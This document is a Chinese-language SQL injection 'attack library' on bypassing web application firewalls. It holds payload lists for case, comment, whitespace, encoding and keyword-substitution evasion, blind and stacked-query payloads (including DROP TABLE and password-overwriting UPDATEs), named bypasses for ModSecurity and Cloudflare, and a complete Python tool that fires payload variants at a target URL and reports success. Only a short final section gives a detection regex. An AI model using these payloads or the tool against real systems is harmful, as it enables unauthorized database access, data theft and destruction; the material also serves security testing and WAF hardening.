# SQL注入-WAF绕过技术 攻击库

## 漏洞概述

WAF(Web Application Firewall)绕过是SQL注入攻击中的重要技术,当目标应用部署了WAF或实施了黑名单过滤时,攻击者需要使用各种编码、混淆和替代语法技术来绕过检测,成功执行SQL注入攻击。

**攻击价值**:
- 绕过安全防护机制
- 在受保护环境中执行SQL注入
- 提取敏感数据
- 绕过输入验证
- 执行高级SQL操�作

**常见WAF/过滤**:
- ModSecurity
- Cloudflare WAF
- AWS WAF
- 应用层黑名单过滤
- 正则表达式过滤

## 核心绕过技术

### 1. 大小写混淆绕过

**原理**: SQL语句不区分大小写,但WAF规则可能区分

**被过滤**: `SELECT`, `UNION`, `WHERE`, `OR`, `AND`

**绕过载荷**:

```sql
-- 基础大小写混淆
SeLeCt * FrOm users
UnIoN SeLeCt 1,2,3
WhErE id=1 oR 1=1

-- 全大写
SELECT * FROM USERS WHERE ID=1 OR 1=1

-- 随机大小写
sElEcT * fRoM users wHeRe id=1 Or 1=1
```

**Python生成脚本**:

```python
import random

def case_混淆(sql):
    """生成大小写混淆的SQL"""
    result = ''
    for char in sql:
        if random.choice([True, False]):
            result += char.upper()
        else:
            result += char.lower()
    return result

# 使用
original = "select * from users where id=1 or 1=1"
bypassed = case_混淆(original)
print(bypassed)
# 输出: sElEcT * FrOm UsErS wHeRe Id=1 Or 1=1
```

### 2. 注释符绕过

**原理**: 使用SQL注释符分隔关键字

**被过滤**: `UNION SELECT`, `OR 1=1`

**绕过载荷**:

```sql
-- 使用/**/注释
UN/**/ION SE/**/LECT 1,2,3
SE/**/LECT * FR/**/OM users
WH/**/ERE id=1 OR/**/ 1=1

-- 使用#注释(MySQL)
UNION#comment
SELECT 1,2,3

-- 使用--注释
UNION--comment
SELECT 1,2,3

-- 多层注释嵌套
UN/*comment1*/IO/*comment2*/N SE/**/LECT

-- 注释中插入垃圾数据
UN/*garbage123*/ION/*xyz*/SE/*abc*/LECT
```

**自动生成脚本**:

```python
def comment_bypass(keyword):
    """在关键字中插入注释"""
    result = ''
    for i, char in enumerate(keyword):
        result += char
        if i < len(keyword) - 1:
            result += '/**/'
    return result

# 使用
print(comment_bypass('UNION'))    # U/**/N/**/I/**/O/**/N
print(comment_bypass('SELECT'))   # S/**/E/**/L/**/E/**/C/**/T
```

### 3. 空白字符绕过

**原理**: 使用各种空白字符代替空格

**被过滤**: 空格` `

**绕过载荷**:

```sql
-- 使用Tab(\t)
SELECT*FROM\tusers\tWHERE\tid=1

-- 使用换行(\n)
SELECT*FROM
users
WHERE
id=1

-- 使用回车(\r)
SELECT*FROM\rusers

-- 混合使用
SELECT\t*\nFROM\r\nusers

-- 使用+号(URL编码空格)
SELECT+*+FROM+users

-- 使用括号代替空格
SELECT(username)FROM(users)

-- 无空格
SELECT*FROM`users`WHERE`id`=1
```

**Python实现**:

```python
def whitespace_bypass(sql):
    """替换空格为其他空白字符"""
    import random
    
    whitespaces = ['\t', '\n', '\r', '\f', '\v', '+', '/**/']
    
    result = ''
    for char in sql:
        if char == ' ':
            result += random.choice(whitespaces)
        else:
            result += char
    
    return result
```

### 4. 编码绕过

**A. URL编码**

```sql
-- 单次编码
%53%45%4c%45%43%54  # SELECT
%55%4e%49%4f%4e     # UNION

-- 双重编码
%2553%2545%254c%2545%2543%2554  # SELECT

-- 混合编码
SE%4cECT
UNI%4fN
```

**B. Unicode编码**

```sql
-- Unicode转义
\u0053\u0045\u004c\u0045\u0043\u0054  # SELECT

-- 宽字节注入
%bf%27 OR 1=1--
```

**C. Hex编码**

```sql
-- Hex编码字符串
SELECT 0x61646d696e  # 'admin'
SELECT CHAR(97,100,109,105,110)  # 'admin'

-- 在UNION中使用
UNION SELECT 0x61646d696e,0x70617373776f7264
```

**编码生成脚本**:

```python
def generate_encoded_payloads(sql):
    """生成多种编码的payload"""
    import urllib.parse
    
    payloads = {
        'url_encode': urllib.parse.quote(sql),
        'double_encode': urllib.parse.quote(urllib.parse.quote(sql)),
        'hex': '0x' + sql.encode().hex(),
        'char': 'CHAR(' + ','.join([str(ord(c)) for c in sql]) + ')',
    }
    
    return payloads

# 使用
payloads = generate_encoded_payloads('admin')
for name, payload in payloads.items():
    print(f"{name}: {payload}")
```

### 5. 关键字替换绕过

**被过滤**: `OR`, `AND`, `=`

**绕过方法**:

```sql
-- OR的替代
OR -> ||
OR -> LIKE
WHERE 1=1 OR 1=1 -> WHERE 1=1 || 1=1
username='admin' OR '1'='1' -> username='admin' || '1' LIKE '1'

-- AND的替代
AND -> &&
WHERE id=1 AND name='admin' -> WHERE id=1 && name='admin'

-- =的替代
= -> LIKE
= -> IN
= -> REGEXP
username='admin' -> username LIKE 'admin'
id=1 -> id IN (1)
username='admin' -> username REGEXP '^admin$'

-- 不等于的替代
!= -> <>
<> -> NOT LIKE

-- 空格的替代
' ' -> /**/
' ' -> +
' ' -> %20
' ' -> %09(Tab)
```

### 6. 函数等价替换

**被过滤**: `SUBSTRING`, `ASCII`, `LENGTH`

**绕过方法**:

```sql
-- SUBSTRING的替代
SUBSTRING(str,1,1) -> MID(str,1,1)
SUBSTRING(str,1,1) -> SUBSTR(str,1,1)
SUBSTRING(str,1,1) -> LEFT(str,1)
SUBSTRING(str,1,1) -> RIGHT(str,1)

-- ASCII的替代
ASCII('a') -> ORD('a')
ASCII('a') -> HEX('a')

-- LENGTH的替代
LENGTH(str) -> CHAR_LENGTH(str)
LENGTH(str) -> CHARACTER_LENGTH(str)

-- IF的替代
IF(1=1,'a','b') -> CASE WHEN 1=1 THEN 'a' ELSE 'b' END

-- CONCAT的替代
CONCAT('a','b') -> 'a'||'b'
CONCAT('a','b') -> CONCAT_WS('','a','b')
```

### 7. 换行和注释组合绕过

**场景**: 过滤`UNION SELECT`组合

**绕过载荷**:

```sql
-- 换行分隔
UNION
SELECT 1,2,3

-- 注释分隔
UNION/**/SELECT/**/1,2,3

-- 组合技巧
UN/**/ION
SE/**/LECT

-- 深度混淆
UN/*comment*/IO/**/N%0aSE/**/LE/**/CT
```

### 8. 字符串拼接绕过

**被过滤**: `'admin'`字符串

**绕过方法**:

```sql
-- CONCAT拼接
'admin' -> CONCAT('ad','min')
'admin' -> CONCAT(CHAR(97,100),CHAR(109,105,110))

-- 使用||
'admin' -> 'ad'||'min'

-- 使用Hex
'admin' -> 0x61646d696e

-- 使用CHAR
'admin' -> CHAR(97,100,109,105,110)
```

### 9. 盲注绕过技术

**时间盲注绕过**:

```sql
-- 标准时间盲注
AND SLEEP(5)

-- 绕过SLEEP过滤
AND BENCHMARK(50000000,MD5('a'))
AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)

-- 使用CASE
AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END

-- 重量级查询延时
AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
```

**布尔盲注绕过**:

```sql
-- 使用LIKE
AND '1' LIKE '1'

-- 使用REGEXP
AND '1' REGEXP '1'

-- 使用IN
AND 1 IN (1)

-- 使用BETWEEN
AND 1 BETWEEN 0 AND 2
```

### 10. 堆叠查询绕过

**原理**: 使用分号执行多条SQL语句

**载荷**:

```sql
-- 基础堆叠
1; DROP TABLE users--

-- 绕过过滤
1;%0aDROP%0aTABLE%0ausers--

-- 插入恶意数据
1; INSERT INTO users VALUES('hacker','password')--

-- 更新数据
1; UPDATE users SET password='hacked' WHERE id=1--
```

## 综合绕过工具

```python
#!/usr/bin/env python3
import requests
import urllib.parse
import random

class SQLiWAFBypass:
    """SQL注入WAF绕过工具"""
    
    def __init__(self, target_url, param='id'):
        self.target_url = target_url
        self.param = param
    
    def case_variation(self, sql):
        """大小写变化"""
        variations = [
            sql.upper(),
            sql.lower(),
            sql.title(),
            ''.join(random.choice([c.upper(), c.lower()]) for c in sql)
        ]
        return variations
    
    def comment_injection(self, sql):
        """注释注入"""
        # 在每个字符之间插入注释
        result = ''
        for i, char in enumerate(sql):
            result += char
            if i < len(sql) - 1 and sql[i].isalpha():
                result += '/**/'
        return result
    
    def whitespace_替换(self, sql):
        """空白字符替换"""
        replacements = {
            ' ': ['/**/', '\t', '\n', '+', '%09', '%0a'],
        }
        
        result = sql
        for old, news in replacements.items():
            for new in news:
                yield result.replace(old, new)
    
    def encoding_bypass(self, sql):
        """编码绕过"""
        bypasses = []
        
        # URL编码
        bypasses.append(urllib.parse.quote(sql))
        
        # 双重URL编码
        bypasses.append(urllib.parse.quote(urllib.parse.quote(sql)))
        
        # Hex编码(对于字符串)
        if "'" in sql:
            # 提取字符串并编码
            import re
            def hex_encode_match(match):
                s = match.group(1)
                return '0x' + s.encode().hex()
            
            hex_encoded = re.sub(r"'([^']+)'", hex_encode_match, sql)
            bypasses.append(hex_encoded)
        
        return bypasses
    
    def keyword_replacement(self, sql):
        """关键字替换"""
        replacements = {
            ' OR ': [' || ', ' LIKE ', ' RLIKE '],
            ' AND ': [' && ', ' & '],
            '=': [' LIKE ', ' IN ', ' REGEXP '],
            'SUBSTRING': ['MID', 'SUBSTR', 'LEFT'],
        }
        
        results = [sql]
        
        for old, news in replacements.items():
            new_results = []
            for result in results:
                if old in result.upper():
                    for new in news:
                        new_results.append(result.replace(old, new))
            if new_results:
                results.extend(new_results)
        
        return results
    
    def generate_bypass_payloads(self, base_payload):
        """生成所有绕过payload"""
        
        payloads = []
        
        # 1. 大小写变化
        payloads.extend(self.case_variation(base_payload))
        
        # 2. 注释注入
        payloads.append(self.comment_injection(base_payload))
        
        # 3. 空白字符替换
        for p in self.whitespace_替换(base_payload):
            payloads.append(p)
        
        # 4. 编码绕过
        payloads.extend(self.encoding_bypass(base_payload))
        
        # 5. 关键字替换
        payloads.extend(self.keyword_replacement(base_payload))
        
        # 去重
        return list(set(payloads))
    
    def test_bypass(self, base_payload):
        """测试绕过"""
        print(f"[*] 基础Payload: {base_payload}\n")
        print(f"[*] 生成绕过变种...\n")
        
        bypass_payloads = self.generate_bypass_payloads(base_payload)
        
        print(f"[*] 生成了 {len(bypass_payloads)} 个变种payload\n")
        
        for i, payload in enumerate(bypass_payloads[:20], 1):  # 只测试前20个
            print(f"[{i}] 测试: {payload[:80]}...")
            
            try:
                response = requests.get(
                    self.target_url,
                    params={self.param: payload},
                    timeout=5
                )
                
                if response.status_code == 200:
                    # 检查成功标志
                    if any(indicator in response.text.lower() for indicator in 
                           ['admin', 'flag', 'success', 'error', 'mysql']):
                        print(f"  [+] 可能成功! 状态码: {response.status_code}")
                        print(f"  [+] 响应长度: {len(response.text)}")
                        
                        if 'flag' in response.text.lower():
                            print(f"  [!!!] 发现FLAG!")
                            return payload, response.text
                
                elif response.status_code == 403:
                    print(f"  [-] 被WAF阻止")
                
            except Exception as e:
                print(f"  [!] 错误: {e}")
        
        return None, None
    
    def auto_exploit(self):
        """自动化利用"""
        print(f"\n{'='*60}")
        print(f"SQL注入WAF绕过测试")
        print(f"目标: {self.target_url}")
        print(f"{'='*60}\n")
        
        # 测试payload列表
        test_payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT 1,2,3--",
            "1' AND 1=1--",
            "1' ORDER BY 3--",
        ]
        
        for base_payload in test_payloads:
            print(f"\n{'='*60}")
            success_payload, response = self.test_bypass(base_payload)
            
            if success_payload:
                print(f"\n[+] 成功payload: {success_payload}")
                print(f"[+] 响应: {response[:500]}")
                return True
        
        return False

# 使用示例
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("用法: python3 sqli_waf_bypass.py <target_url> [param]")
        print("示例: python3 sqli_waf_bypass.py http://target.com/page id")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'id'
    
    bypass = SQLiWAFBypass(target, param)
    bypass.auto_exploit()
```

## 实战绕过案例

### 案例1: 绕过ModSecurity

```sql
-- 原始payload(被阻止)
1' UNION SELECT 1,2,3--

-- 绕过方法
1'/**/UN/**/ION/**/SE/**/LECT/**/1,2,3--
1'%0aUNION%0aSELECT%0a1,2,3--
1'||UN||ION||SE||LECT||1,2,3--
```

### 案例2: 绕过Cloudflare WAF

```sql
-- 使用混合技术
1'/**/UnI/**/On/**/sEl/**/EcT/**/1,2,3--

-- 使用编码
1'%55%4e%49%4f%4e%20%53%45%4c%45%43%54%201,2,3--
```

### 案例3: 绕过黑名单过滤

```python
# 过滤了: SELECT, UNION, OR, AND

# 绕过SELECT
payload = "1' UN\x00ION SE\x00LECT 1,2,3--"

# 使用换行
payload = "1' UNION\nSELECT\n1,2,3--"

# 使用大小写
payload = "1' uNiOn sElEcT 1,2,3--"
```

## 防御检测

**有效的WAF规则**:

```python
import re

def advanced_sqli_detection(input_str):
    """高级SQL注入检测"""
    
    # 规范化输入
    normalized = input_str.lower()
    normalized = re.sub(r'/\*.*?\*/', '', normalized)  # 移除注释
    normalized = re.sub(r'\s+', ' ', normalized)  # 规范化空白
    
    # 检测模式
    dangerous_patterns = [
        r'\bunion\b.*\bselect\b',
        r'\bor\b.*=.*',
        r'\band\b.*=.*',
        r';.*\bdrop\b',
        r';.*\binsert\b',
        r';.*\bupdate\b',
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, normalized):
            return True
    
    return False
```

## 关键成功要点

1. **理解WAF规则**: 分析被阻止的原因
2. **组合技术**: 混合多种绕过方法
3. **迭代测试**: 不断调整payload
4. **编码使用**: 善用各种编码技术
5. **保持更新**: WAF规则在更新,绕过技术也要更新

## 成功标志

- Payload未被WAF阻止(非403状态)
- 成功执行SQL查询
- 获取数据库错误信息
- 提取敏感数据
- 绕过所有安全防护
